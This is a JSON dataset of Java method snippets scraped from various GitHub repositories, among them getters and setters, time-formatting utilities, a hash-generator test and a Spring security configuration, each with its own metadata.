{"id": 57128, "method_name": "setType", "class_name": "ModelInfo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setType(String type) {\n        this.type = type;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57129, "method_name": "getSimpleType", "class_name": "ModelInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSimpleType() {\n        return simpleType;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57130, "method_name": "setSimpleType", "class_name": "ModelInfo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSimpleType(String simpleType) {\n        this.simpleType = simpleType;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57131, "method_name": "getName", "class_name": "ModelInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57132, "method_name": "setName", "class_name": "ModelInfo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = name;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57133, "method_name": "getUpperName", "class_name": "ModelInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUpperName() {\n        return upperName;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57134, "method_name": "setUpperName", "class_name": "ModelInfo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUpperName(String upperName) {\n        this.upperName = upperName;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57135, "method_name": "getDesc", "class_name": "ModelInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDesc() {\n        return desc;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57136, "method_name": "setDesc", "class_name": "ModelInfo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDesc(String desc) {\n        this.desc = desc;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57137, "method_name": "getId", "class_name": "ModelInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "    public Boolean getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57138, "method_name": "setId", "class_name": "ModelInfo", "params": ["Boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Boolean id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57139, "method_name": "main", "class_name": "package_class", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String args[]){\n        Int temp = new Int(10);   //\u88c5\u7bb1\n        int x = temp.intValue();   //\u62c6\u7bb1\n        System.out.println(x*2);\n\n//        Integer\u5b9e\u4f8b\n        Integer obj = new Integer(10);\n        int sum = obj.intValue();\n        System.out.println(sum);\n\n//        Boolean\u5b9e\u4f8b\n        Boolean obj1 = new Boolean(false);\n        System.out.println(obj1);\n\n//        \u81ea\u52a8\u88c5\u7bb1\u62c6\u7bb1\n        Integer obj2 = 10;   //\u81ea\u52a8\u88c5\n        int num = obj2;    // \u81ea\u52a8\u62c6\n        obj2++;  // \u5bf9\u8c61\u53ef\u4ee5\u76f4\u63a5\u6570\u5b66\u8fd0\u7b97\n        System.out.println(num*obj2);\n\n\n        Object obj3 = 19.2;  //double\u81ea\u52a8\u88c5\u7bb1\u4e3aDouble\uff0c\u5411\u4e0a\u8f6c\u578b\u4e3aObject\n        double num1 = (Double) obj3;  //\u5411\u4e0b\u8f6c\u578b\u4e3a\u5305\u88c5\u7c7b\uff0c\u518d\u81ea\u52a8\u62c6\u7bb1\n        System.out.println(num1*2);\n\n\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/javaStudy/package_class.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57140, "method_name": "intValue", "class_name": "Int", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int intValue(){\n        return this.data;\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/javaStudy/package_class.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57141, "method_name": "setUp", "class_name": "HashGeneratorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void setUp() {\n        hashGenerator = new HashGenerator(PEPPER_VALUE);\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/domain/use_cases/interactors/HashGeneratorTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57142, "method_name": "hasher_devrait_retourner_un_hash_de_donnees_avec_un_pepper", "class_name": "HashGeneratorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void hasher_devrait_retourner_un_hash_de_donnees_avec_un_pepper() {\n        // Given\n        String chaine = \"DUPONTJEAN1990-12-12PARIS\";\n\n        // When\n        String resultat = hashGenerator.hasherAvecPepper(chaine);\n\n        // Then\n        assertThat(resultat).isEqualTo(\"4ed6o/Jcn8puliRsyKswvY8/afhZ4RpVQJwsPjIWxsSinWEzBAO6UAmpA1GEOLUBRx0rArLaVFtCM4Fk/ZX8ig==\");\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/domain/use_cases/interactors/HashGeneratorTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57143, "method_name": "hasher_devrait_retourner_toujours_le_meme_hash_de_donnees_pour_une_meme_chaine", "class_name": "HashGeneratorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void hasher_devrait_retourner_toujours_le_meme_hash_de_donnees_pour_une_meme_chaine() {\n        // Given\n        String chaine = \"DUPONTJEAN1990-12-12PARIS\";\n\n        // When\n        String result1 = hashGenerator.hasherAvecPepper(chaine);\n        String result2 = hashGenerator.hasherAvecPepper(chaine);\n\n        // Then\n        assertThat(result1).isEqualTo(\"4ed6o/Jcn8puliRsyKswvY8/afhZ4RpVQJwsPjIWxsSinWEzBAO6UAmpA1GEOLUBRx0rArLaVFtCM4Fk/ZX8ig==\");\n        assertThat(result2).isEqualTo(result1);\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/domain/use_cases/interactors/HashGeneratorTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57144, "method_name": "afterPropertiesSet", "class_name": "SecurityProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void afterPropertiesSet() {\n        // \u4e00\u4e9b\u9ed8\u8ba4\u5f00\u653e\u7684\u63a5\u53e3\n        permitAllUrls.addAll(Arrays.asList(\n                \"/swagger-ui.html\",\n                \"/v2/**\",\n                \"/swagger-resources/**\",\n                \"/webjars/**\",\n                \"/resources/**\",\n                \"/*.html\",\n                \"/*.htm\",\n                \"/*.js\",\n                \"/*.css\")\n        );\n        RequestMappingHandlerMapping mapping = applicationContext.getBean(RequestMappingHandlerMapping.class);\n        Map<RequestMappingInfo, HandlerMethod> map = mapping.getHandlerMethods();\n\n        // \u6536\u96c6 NotAuth \u6ce8\u89e3\u7684\u63a5\u53e3\n        map.keySet().forEach(info -> {\n            HandlerMethod handlerMethod = map.get(info);\n\n            Optional.ofNullable(AnnotationUtils.findAnnotation(handlerMethod.getMethod(), NotAuth.class))\n                    .ifPresent(inner -> info.getPatternsCondition().getPatterns()\n                            .forEach(url -> permitAllUrls.add(ReUtil.replaceAll(url, \"\\\\{(.*?)\\\\}\", \"*\"))));\n\n            Optional.ofNullable(AnnotationUtils.findAnnotation(handlerMethod.getBeanType(), NotAuth.class))\n                    .ifPresent(inner -> info.getPatternsCondition().getPatterns()\n                            .forEach(url -> permitAllUrls.add(ReUtil.replaceAll(url, \"\\\\{(.*?)\\\\}\", \"*\"))));\n\n            Optional.ofNullable(AnnotationUtils.findAnnotation(handlerMethod.getMethod(), ValidateCode.class))\n                    .ifPresent(inner -> info.getPatternsCondition().getPatterns()\n                            .forEach(url -> validateCodeUrls.add(ReUtil.replaceAll(url, \"\\\\{(.*?)\\\\}\", \"*\"))));\n\n            Optional.ofNullable(AnnotationUtils.findAnnotation(handlerMethod.getBeanType(), ValidateCode.class))\n                    .ifPresent(inner -> info.getPatternsCondition().getPatterns()\n                            .forEach(url -> validateCodeUrls.add(ReUtil.replaceAll(url, \"\\\\{(.*?)\\\\}\", \"*\"))));\n        });\n\n        log.info(\"permit all urls: {}\", permitAllUrls);\n        log.info(\"validate code urls: {}\", validateCodeUrls);\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/security/SecurityProperties.java", "stars": "6", "class_props": {"extends": null, "implements": ["InitializingBean"], "modifiers": ["public"]}}, {"id": 57145, "method_name": "getContractId", "class_name": "ContractGroupRemove", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContractId() {\n        return contractId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/contract/ContractGroupRemove.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57146, "method_name": "setContractId", "class_name": "ContractGroupRemove", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContractId(int value) {\n        this.contractId = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/contract/ContractGroupRemove.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57147, "method_name": "getContractGroupId", "class_name": "ContractGroupRemove", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContractGroupId() {\n        return contractGroupId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/contract/ContractGroupRemove.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57148, "method_name": "setContractGroupId", "class_name": "ContractGroupRemove", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContractGroupId(int value) {\n        this.contractGroupId = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/contract/ContractGroupRemove.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57149, "method_name": "newInstance", "class_name": "OTCBuyFragment", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "OTCBuyFragment", "snippet": "    public static OTCBuyFragment newInstance() {\n        return new OTCBuyFragment();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/fragment/otc/OTCBuyFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 57150, "method_name": "onCreateView", "class_name": "OTCBuyFragment", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container,\n                             @Nullable Bundle savedInstanceState) {\n\n        View view = inflater.inflate(R.layout.otc_buy_fragment, container, false);\n        ButterKnife.bind(this, view);\n        return view;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/fragment/otc/OTCBuyFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 57151, "method_name": "onActivityCreated", "class_name": "OTCBuyFragment", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityCreated(@Nullable Bundle savedInstanceState) {\n        super.onActivityCreated(savedInstanceState);\n        // TODO: Use the ViewModel\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/fragment/otc/OTCBuyFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 57152, "method_name": "OnClick", "class_name": "OTCBuyFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void OnClick(){\n        Intent intent = new Intent(getContext(), OrderPayActivity.class);\n        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n        getActivity().startActivity(intent);\n\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/fragment/otc/OTCBuyFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 57153, "method_name": "stringToDateConverter", "class_name": "ConverterConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Converter<String,Date>", "snippet": "    public Converter<String, Date> stringToDateConverter() {\n        return new StringToDateConverter();\n    }", "url": "https://raw.githubusercontent.com/geekidea/spring-cloud-plus/master/scp-framework/scp-framework-config/src/main/java/io/geekidea/cloud/framework/config/converter/ConverterConfig.java", "stars": "22", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57154, "method_name": "stringToIntegerConverter", "class_name": "ConverterConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Converter<String,Integer>", "snippet": "    public Converter<String, Integer> stringToIntegerConverter() {\n        return new StringToIntegerConverter();\n    }", "url": "https://raw.githubusercontent.com/geekidea/spring-cloud-plus/master/scp-framework/scp-framework-config/src/main/java/io/geekidea/cloud/framework/config/converter/ConverterConfig.java", "stars": "22", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57155, "method_name": "stringToDoubleConverter", "class_name": "ConverterConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Converter<String,Double>", "snippet": "    public Converter<String, Double> stringToDoubleConverter() {\n        return new StringToDoubleConverter();\n    }", "url": "https://raw.githubusercontent.com/geekidea/spring-cloud-plus/master/scp-framework/scp-framework-config/src/main/java/io/geekidea/cloud/framework/config/converter/ConverterConfig.java", "stars": "22", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57156, "method_name": "getMsg", "class_name": "Customer1", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getMsg(String msg) {\n        System.out.println(\"itcast: \" + msg);\n    }", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_rabbitmqtest/src/main/java/com/tensquare/rabbit/customer/Customer1.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57157, "method_name": "getId", "class_name": "GrandFather", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_common_property/GrandFather.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57158, "method_name": "setId", "class_name": "GrandFather", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_common_property/GrandFather.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57159, "method_name": "getName", "class_name": "GrandFather", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_common_property/GrandFather.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57160, "method_name": "setName", "class_name": "GrandFather", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = name;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_common_property/GrandFather.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57161, "method_name": "getSuccessorNode", "class_name": "Code07_SuccessorNode", "params": ["Node"], "throws": null, "modifiers": ["public", "static"], "return_type": "Node", "snippet": "\tpublic static Node getSuccessorNode(Node node) {\n\t\tif (node == null) {\n\t\t\treturn node;\n\t\t}\n\t\tif (node.right != null) {\n\t\t\treturn getLeftMost(node.right);\n\t\t} else { // \u65e0\u53f3\u5b50\u6811\n\t\t\tNode parent = node.parent;\n\t\t\twhile (parent != null && parent.right == node) { // \u5f53\u524d\u8282\u70b9\u662f\u5176\u7236\u4eb2\u8282\u70b9\u53f3\u5b69\u5b50\n\t\t\t\tnode = parent;\n\t\t\t\tparent = node.parent;\n\t\t\t}\n\t\t\treturn parent;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class07/Code07_SuccessorNode.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57162, "method_name": "getLeftMost", "class_name": "Code07_SuccessorNode", "params": ["Node"], "throws": null, "modifiers": ["public", "static"], "return_type": "Node", "snippet": "\tpublic static Node getLeftMost(Node node) {\n\t\tif (node == null) {\n\t\t\treturn node;\n\t\t}\n\t\twhile (node.left != null) {\n\t\t\tnode = node.left;\n\t\t}\n\t\treturn node;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class07/Code07_SuccessorNode.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57163, "method_name": "main", "class_name": "Code07_SuccessorNode", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tNode head = new Node(6);\n\t\thead.parent = null;\n\t\thead.left = new Node(3);\n\t\thead.left.parent = head;\n\t\thead.left.left = new Node(1);\n\t\thead.left.left.parent = head.left;\n\t\thead.left.left.right = new Node(2);\n\t\thead.left.left.right.parent = head.left.left;\n\t\thead.left.right = new Node(4);\n\t\thead.left.right.parent = head.left;\n\t\thead.left.right.right = new Node(5);\n\t\thead.left.right.right.parent = head.left.right;\n\t\thead.right = new Node(9);\n\t\thead.right.parent = head;\n\t\thead.right.left = new Node(8);\n\t\thead.right.left.parent = head.right;\n\t\thead.right.left.left = new Node(7);\n\t\thead.right.left.left.parent = head.right.left;\n\t\thead.right.right = new Node(10);\n\t\thead.right.right.parent = head.right;\n\n\t\tNode test = head.left.left;\n\t\tSystem.out.println(test.value + \" next: \" + getSuccessorNode(test).value);\n\t\ttest = head.left.left.right;\n\t\tSystem.out.println(test.value + \" next: \" + getSuccessorNode(test).value);\n\t\ttest = head.left;\n\t\tSystem.out.println(test.value + \" next: \" + getSuccessorNode(test).value);\n\t\ttest = head.left.right;\n\t\tSystem.out.println(test.value + \" next: \" + getSuccessorNode(test).value);\n\t\ttest = head.left.right.right;\n\t\tSystem.out.println(test.value + \" next: \" + getSuccessorNode(test).value);\n\t\ttest = head;\n\t\tSystem.out.println(test.value + \" next: \" + getSuccessorNode(test).value);\n\t\ttest = head.right.left.left;\n\t\tSystem.out.println(test.value + \" next: \" + getSuccessorNode(test).value);\n\t\ttest = head.right.left;\n\t\tSystem.out.println(test.value + \" next: \" + getSuccessorNode(test).value);\n\t\ttest = head.right;\n\t\tSystem.out.println(test.value + \" next: \" + getSuccessorNode(test).value);\n\t\ttest = head.right.right; // 10's next is null\n\t\tSystem.out.println(test.value + \" next: \" + getSuccessorNode(test));\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class07/Code07_SuccessorNode.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57164, "method_name": "getTimeStrBySecond", "class_name": "TimeUtil", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getTimeStrBySecond(int second) {\n        if (second <= 0) {\n\n            return \"00:00:00\";\n        }\n\n        StringBuilder sb = new StringBuilder();\n        int hours = second / HOUR_SECOND;\n        if (hours > 0) {\n\n            second -= hours * HOUR_SECOND;\n        }\n\n        int minutes = second / MINUTE_SECOND;\n        if (minutes > 0) {\n\n            second -= minutes * MINUTE_SECOND;\n        }\n\n        return (hours >= 10 ? (hours + \"\")\n                : (\"0\" + hours) + \":\" + (minutes >= 10 ? (minutes + \"\") : (\"0\" + minutes)) + \":\"\n                + (second >= 10 ? (second + \"\") : (\"0\" + second)));\n    }", "url": "https://raw.githubusercontent.com/Florizt/RxMVVM/master/rxmvvmlib/src/main/java/com/rx/rxmvvmlib/util/TimeUtil.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57165, "method_name": "getTimeFormatText", "class_name": "TimeUtil", "params": ["Date", "TypeListener"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getTimeFormatText(Date date, TypeListener typeListener) {\n        if (date == null) {\n            return null;\n        }\n        long diff = new Date().getTime() - date.getTime();\n        long r = 0;\n        if (diff > year) {\n            r = (diff / year);\n            if (typeListener != null) {\n                typeListener.type(5);\n            }\n            return r + UIUtils.getString(R.string.year_ago);\n        }\n        if (diff > month) {\n            r = (diff / month);\n            if (typeListener != null) {\n                typeListener.type(4);\n            }\n            return r + UIUtils.getString(R.string.month_ago);\n        }\n        if (diff > day) {\n            r = (diff / day);\n            if (typeListener != null) {\n                typeListener.type(3);\n            }\n            return r + UIUtils.getString(R.string.day_ago);\n        }\n        if (diff > hour) {\n            r = (diff / hour);\n            if (typeListener != null) {\n                typeListener.type(2);\n            }\n            return r + UIUtils.getString(R.string.hour_ago);\n        }\n        if (diff > minute) {\n            r = (diff / minute);\n            if (typeListener != null) {\n                typeListener.type(1);\n            }\n            return r + UIUtils.getString(R.string.minute_ago);\n        }\n        if (typeListener != null) {\n            typeListener.type(0);\n        }\n        return UIUtils.getString(R.string.now);\n    }", "url": "https://raw.githubusercontent.com/Florizt/RxMVVM/master/rxmvvmlib/src/main/java/com/rx/rxmvvmlib/util/TimeUtil.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57166, "method_name": "getTimeShowString", "class_name": "TimeUtil", "params": ["long", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getTimeShowString(long milliseconds, boolean abbreviate) {\n        String dataString;\n        String timeStringBy24;\n\n        Date currentTime = new Date(milliseconds);\n        Date today = new Date();\n        Calendar todayStart = Calendar.getInstance();\n        todayStart.set(Calendar.HOUR_OF_DAY, 0);\n        todayStart.set(Calendar.MINUTE, 0);\n        todayStart.set(Calendar.SECOND, 0);\n        todayStart.set(Calendar.MILLISECOND, 0);\n        Date todaybegin = todayStart.getTime();\n        Date yesterdaybegin = new Date(todaybegin.getTime() - 3600 * 24 * 1000);\n        Date preyesterday = new Date(yesterdaybegin.getTime() - 3600 * 24 * 1000);\n\n        SimpleDateFormat timeformatter24 = new SimpleDateFormat(\"HH:mm\", Locale.getDefault());\n        timeStringBy24 = timeformatter24.format(currentTime);\n\n        if (!currentTime.before(todaybegin)) {\n            return getTodayTimeBucket(currentTime);\n        } else {\n            if (!currentTime.before(yesterdaybegin)) {\n                dataString = UIUtils.getString(R.string.yesterday) + (abbreviate ? \"\" : \" \" + timeStringBy24);\n            } else if (!currentTime.before(preyesterday)) {\n                dataString = UIUtils.getString(R.string.the_day_before_yesterday) + (abbreviate ? \"\" : \" \" + timeStringBy24);\n            } else if (isSameWeekDates(currentTime, today)) {\n                dataString = getWeekOfDate(currentTime) + (abbreviate ? \"\" : \" \" + timeStringBy24);\n            } else {\n                SimpleDateFormat dateformatter = new SimpleDateFormat(\"MM\u6708dd\u65e5\", Locale.getDefault());\n                String s = dateformatter.format(currentTime);\n                if (LanguageUtil.isZh(UIUtils.getContext())) {\n                    dataString = s + (abbreviate ? \"\" : \" \" + timeStringBy24);\n                } else {\n                    dataString = s.substring(0, 2) + \"/\" + s.substring(3, 5) + (abbreviate ? \"\" : \" \" + timeStringBy24);\n                }\n            }\n            return dataString;\n        }\n    }", "url": "https://raw.githubusercontent.com/Florizt/RxMVVM/master/rxmvvmlib/src/main/java/com/rx/rxmvvmlib/util/TimeUtil.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57167, "method_name": "getTrackDate", "class_name": "TimeUtil", "params": ["long"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getTrackDate(long milliseconds) {\n        String dataString;\n\n        Date currentTime = new Date(milliseconds);\n        Date today = new Date();\n        Calendar todayStart = Calendar.getInstance();\n        todayStart.set(Calendar.HOUR_OF_DAY, 0);\n        todayStart.set(Calendar.MINUTE, 0);\n        todayStart.set(Calendar.SECOND, 0);\n        todayStart.set(Calendar.MILLISECOND, 0);\n        Date todaybegin = todayStart.getTime();\n        Date yesterdaybegin = new Date(todaybegin.getTime() - 3600 * 24 * 1000);\n        Date preyesterday = new Date(yesterdaybegin.getTime() - 3600 * 24 * 1000);\n\n        if (!currentTime.before(todaybegin)) {\n            return UIUtils.getString(R.string.today);\n        } else {\n            if (!currentTime.before(yesterdaybegin)) {\n                dataString = UIUtils.getString(R.string.yesterday);\n            } else if (!currentTime.before(preyesterday)) {\n                dataString = UIUtils.getString(R.string.the_day_before_yesterday);\n            } else if (isSameYear(currentTime, today)) {\n                SimpleDateFormat dateformatter = new SimpleDateFormat(\"MM.dd\", Locale.getDefault());\n                dataString = dateformatter.format(currentTime);\n            } else {\n                SimpleDateFormat dateformatter = new SimpleDateFormat(\"MM.dd\\nyyyy\", Locale.getDefault());\n                dataString = dateformatter.format(currentTime);\n            }\n            return dataString;\n        }\n    }", "url": "https://raw.githubusercontent.com/Florizt/RxMVVM/master/rxmvvmlib/src/main/java/com/rx/rxmvvmlib/util/TimeUtil.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57168, "method_name": "getTrackTime", "class_name": "TimeUtil", "params": ["long", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getTrackTime(long milliseconds, boolean space) {\n        Date currentTime = new Date(milliseconds);\n        SimpleDateFormat timeformatter24 = new SimpleDateFormat(\"HH:mm\", Locale.getDefault());\n        String timeStringBy24 = timeformatter24.format(currentTime);\n        int hour = Integer.parseInt(timeStringBy24.substring(0, 2));\n        return timeStringBy24 + (space ? \" \" : \"\") + (hour < 12 ? \"am\" : \"pm\");\n    }", "url": "https://raw.githubusercontent.com/Florizt/RxMVVM/master/rxmvvmlib/src/main/java/com/rx/rxmvvmlib/util/TimeUtil.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57169, "method_name": "getTrackHour", "class_name": "TimeUtil", "params": ["long", "long"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getTrackHour(long startMilliseconds, long endMilliseconds) {\n        /*SimpleDateFormat simpleDateFormat = new SimpleDateFormat(\"yyyy-MM-dd HH:mm\", Locale.getDefault());\n\n        Date startCurrentTime = new Date(startMilliseconds);\n        String startTime = simpleDateFormat.format(startCurrentTime);\n        int startYear = Integer.parseInt(startTime.substring(0, 4));\n        int startMonth = Integer.parseInt(startTime.substring(5, 7));\n        int startDay = Integer.parseInt(startTime.substring(8, 10));\n        int startHour = Integer.parseInt(startTime.substring(11, 13));\n        int 